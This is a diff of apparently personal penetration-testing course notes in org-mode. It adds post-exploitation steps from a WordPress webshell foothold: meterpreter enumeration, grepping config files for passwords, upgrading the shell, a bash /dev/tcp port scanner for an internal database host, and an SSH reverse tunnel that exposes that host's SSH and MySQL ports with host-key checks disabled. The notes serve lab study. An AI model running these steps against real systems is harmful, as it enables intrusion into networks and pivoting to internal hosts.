@@ -1618,6 +1618,18 @@ hashid '<hash>'                # hashtype analyse
   + https encapsulated forward
     
 ** ssh port forwarding
+   + summary:
+     - ssh -L <lP>:<dstHost>:<dstPortOfDstHost> <jumpHost>
+     - at $thisMachine, connection to $lP will be tunneled through $jumpHost, to $dstHost:$dstPortOfDstHost
+
+     - ssh -R <rP>:<dstHost(near)>:<dstPortOfDstHost> <remoteHost>
+     - at $remoteHost, connection to $rP will be tunneled back through $thisMachine, to $dstHost:$dstPortOfDstHost
+
+   + ref: [[https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot/115906#115906?newreg=af8295aa987441dfb6cef53ffca8139a][ssh port forwarding explaination]]
+   + img: 
+     - [[./img/b3cp20_ssh-local-port-forwarding.png]]
+     - [[./img/b3cp20_ssh-remote-port-forwarding.png]]
+
    + src:
    #+begin_src sh
 ssh -L [bind_address:]<localPort>[[:remoteHost]:remotePort] <id>@<remoteHost>
@@ -3179,31 +3191,57 @@ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph p?cmd=
     #+END_SRC
     
 *** Post-Exploitation Enumeration
-    + enum meta infos
-    #+BEGIN_SRC sh
+**** enum meta infos
+     + info:
+       - general enumeration
+       - [[https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux][grep file content recursively]]
+     + src:
+     #+BEGIN_SRC sh
 meterpreter > shell
 ifconfig # ip address
 hostname # ajla
 cat /etc/issue # Ubuntu 20.04.2 LTS \n \l
-cat /proc/version # Linux version 5.8.0-53-generic (buildd@lcy01-amd64-012) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #60~20.04.1-Ubuntu SMP Thu May 6 09:52:46 UTC 2021
+cat /proc/version # Linux version 5.8.0-53-generic ...
 pwd # /var/www/html/wp-content/plugins/plugin-shell
 cd /var/www/html
 ls -lah
 cat wp-config.php # find config file, or:
-grep -rnw '/path/to/somewhere/' -e 'PASSWORD' ## grep match in the folder
+grep -rnw '/path/to/somewhere/' -e 'PASSWORD' 
+  ## grep files that contain the string 'PASSWORD'
   ## -r recursive, -n line number, -w match the whole word, -e pattern
-  ## ref: [[https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux]]
+      #+END_SRC
+
+**** TODO (optional) python interactive shell?
+     + ref:
+       - [[https://unix.stackexchange.com/questions/21752/what-s-the-difference-between-a-raw-and-a-cooked-device-driver][stty raw -echo]]
+
+     + src:
+     #+BEGIN_SRC sh
+python -c 'import pty;pty.spawn("/bin/bash");'
+  ## C-z to background, then:
+stty raw -echo
+  ## fg 
+
+  ## ?
+export SHELL=bash
+export TERM=xterm256-color
+stty rows 38 columns 116
+reset
      #+END_SRC
 
-     + enum opened port, check DB default ports first maybe? (/dev/tcp/host/port) (portscan.sh)
+**** TODO enum opened port (bash: /dev/tcp/host/port) (portscan.sh)
+     + info:
+       - use a bash specific feature to enumerate opened ports of internal nodes.
+       - when used in redirection, bash handles "/dev/tcp/host/port" differently. see: [[https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Redirections][bash redirections]]
+       - (check DB default port first maybe)
+       - TODO use remote dynamic port forwarding, then use namp with proxy to scan service host? `ssh -R 1080 kali@ip`, `nmap -sS -sC -oG 10.5.5.11 --proxy 127.0.0.1: 1080`, but beware the amount of traffic.
+     + src:
      #+BEGIN_SRC bash
 #!/bin/bash
 # hosts=(127.0.0.1 127.0.0.2 127.0.0.3)
 hosts=(10.5.5.11)   ## DB_HOST
 # ports=(22 23 25 80)
-
 # timeout .1 bash -c "echo > /dev/tcp/$host/$port" && echo "port $port is open, host $hosts"
-
 for host in "${hosts[@]}"; do
   # for port in "${ports[@]}";
   for port in {1..65535}; do
@@ -3214,17 +3252,47 @@ done
 echo "Done"
 # (PWK p778)
      #+END_SRC
-       - info: when used in redirection, bash handles "/dev/tcp/host/port" differently.
-       - ref: [[https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Redirections][bash redirections]]
-     + upload the file
+
+**** (optional) upload the file
+     + info: several methods?
+       - use meterpreter upload
+       - use webshell to write directly
+       - use wget to download from http server
+     + src:
      #+BEGIN_SRC bash
 # meterpreter > upload /home/kali/portscan.sh /tmp/portscan.sh
 # meterpreter > shell
-# or use webshell to write directly, or use wget to download from http server?
-
 cd /tmp
 chmod +x portscan.sh
 ./portscan.sh
+     #+END_SRC
+     
+**** ssh port forwarding (remote)
+     + ref: [[ssh port forwarding]]
+     + info: 
+       - Use ssh REMOTE port forward. Since the aim is to access DB_HOST from public.
+       - use params to remove confirmations, since the shell may not be fully interative.
+     + src:
+     #+BEGIN_SRC sh
+ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o
+"StrictHostKeyChecking=no" kali@10.11.0.4
+     #+END_SRC
+     
+**** generate temporary ssh-key and connect
+     + info:
+       - security reason, maybe do not want to use password on a compromised machine
+     + src:
+     #+BEGIN_SRC sh
+mkdir -p /tmp/keys
+# ssh-keygen -t rsa -b 4096
+ssh-keygen -t ed25519
+  # save to /tmp/keys/id_ed25519
+cat /tmp/id_ed25519.pub
+  # on host, modify ~/.ssh/authorized_keys
+cat << EOF >> ~/.ssh/authorized_keys
+from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",
+no-agent-forwarding,no-X11-forwarding,no-pty ssh-ed25519 AAA...
+EOF
      #+END_SRC
      // CONTINUE
 
